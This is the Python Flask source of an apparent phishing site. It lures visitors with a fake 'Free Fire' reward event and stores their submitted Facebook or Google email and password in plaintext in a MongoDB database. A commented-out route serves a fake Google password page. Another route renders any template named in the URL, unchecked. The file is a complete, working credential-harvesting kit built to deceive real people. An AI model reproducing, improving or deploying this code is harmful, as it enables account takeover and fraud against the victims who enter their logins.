from flask import Flask, render_template, request,session,redirect
from pymongo import MongoClient
import re
from dotenv import load_dotenv
import os
from flask.helpers import url_for


load_dotenv()

app=Flask(__name__)
app.secret_key = os.environ.get("SECRET") 
db=MongoClient(os.environ.get("DB_URL")).freefire

@app.route('/')
def index():
    session['user']=None
    return render_template('index.html',err=None)

# @app.route("/gauth",methods=['GET','POST'])
# def glogin():
#     if request.method=='POST':
#         session['user']=request.form['identifier']
#         if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
#         return render_template('googlepass.html',act=session['user'])
#     else: return redirect(url_for('index'))

@app.route("/reward",methods=['GET','POST'])
def share():
    if request.method=='POST':
        if session['user']==None:
            email=request.form['email']
            passwd=request.form['pass']
            act='facebook'
        else:
            email=session['user']
            passwd=request.form['password']
            act='google'
        if not [i for i in db.users.find({'user':email,'password':passwd,'account':act})]:
            return render_template('share.html',id=str(db.users.insert_one({"user":email,"password":passwd,"account":act}).inserted_id)[-10:-1])
        else: return render_template('index.html',err="Your already participated in this event wait for receive reward")
    else: return redirect(url_for('index'))

@app.route("/<name>")
def login(name):
    return render_template(f'{name}.html')

if __name__=="__main__":
    app.run()